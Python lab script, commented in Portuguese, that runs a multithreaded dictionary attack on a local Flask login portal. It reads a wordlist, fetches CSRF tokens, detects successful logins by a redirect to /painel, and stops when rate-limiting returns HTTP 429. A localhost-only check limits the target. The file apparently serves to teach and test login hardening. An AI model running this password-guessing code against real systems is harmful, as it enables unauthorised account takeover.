"""Ataque de dicionario contra o portal Flask LOCAL (uso em laboratorio).

Exemplo:
    python3 attack.py admin wordlist.txt
    python3 attack.py ana.souza wordlist.txt --workers 4

Le a wordlist (gerada pelo CUPP) e tenta cada senha. Considera sucesso o
redirecionamento 302 para /painel. Se o portal estiver em modo endurecido,
o script le o token CSRF do formulario e para ao receber HTTP 429 (bloqueio).
So aceita alvos em localhost.
"""
import argparse
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

import requests

TOKEN_RE = re.compile(r'name="csrf_token" value="([0-9a-f]+)"')


def alvo_local(url):
    return urlparse(url).hostname in ("127.0.0.1", "localhost")


def tentar(sess, url, usuario, senha):
    """Retorna 'ok', 'bloqueado' ou 'falha'."""
    dados = {"usuario": usuario, "senha": senha}
    pagina = sess.get(url, timeout=5)
    token = TOKEN_RE.search(pagina.text)
    if token:
        dados["csrf_token"] = token.group(1)
    r = sess.post(url, data=dados, allow_redirects=False, timeout=5)
    if r.status_code == 302 and r.headers.get("Location", "").endswith("/painel"):
        return "ok"
    if r.status_code == 429:
        return "bloqueado"
    return "falha"


def main():
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("usuario")
    ap.add_argument("wordlist")
    ap.add_argument("--url", default="http://127.0.0.1:5000/login")
    ap.add_argument("--workers", type=int, default=1, help="threads (padrao 1)")
    ap.add_argument("--delay", type=float, default=0.0, help="pausa entre tentativas (s)")
    args = ap.parse_args()

    if not alvo_local(args.url):
        sys.exit("Alvo fora do localhost. Abortando.")

    with open(args.wordlist, encoding="utf-8", errors="ignore") as f:
        senhas = [l.strip() for l in f if l.strip()]

    print(f"[*] Alvo: {args.url} | usuario: {args.usuario} | "
          f"{len(senhas)} senhas | threads: {args.workers}")

    parar = threading.Event()
    achada, contagem = {}, {"n": 0}
    lock = threading.Lock()
    local = threading.local()
    inicio = time.time()

    def trabalho(senha):
        if parar.is_set():
            return
        if not hasattr(local, "sess"):
            local.sess = requests.Session()
        resultado = tentar(local.sess, args.url, args.usuario, senha)
        with lock:
            contagem["n"] += 1
            n = contagem["n"]
        if resultado == "ok":
            achada["senha"], achada["n"] = senha, n
            parar.set()
        elif resultado == "bloqueado":
            achada["bloqueio"] = n
            parar.set()
        elif n % 500 == 0:
            print(f"[.] {n}/{len(senhas)} tentativas")
        if args.delay:
            time.sleep(args.delay)

    with ThreadPoolExecutor(max_workers=args.workers) as pool:
        list(pool.map(trabalho, senhas))

    dt = time.time() - inicio
    if "senha" in achada:
        print(f"[+] SUCESSO na tentativa {achada['n']}: "
              f"{args.usuario}:{achada['senha']} ({dt:.1f}s)")
    elif "bloqueio" in achada:
        print(f"[-] BLOQUEADO pelo servidor (HTTP 429) apos {achada['bloqueio']} "
              f"tentativas ({dt:.1f}s). Defesa funcionou.")
        sys.exit(2)
    else:
        print(f"[-] Nenhuma senha da lista funcionou ({contagem['n']} tentativas, {dt:.1f}s).")
        sys.exit(1)


if __name__ == "__main__":
    main()
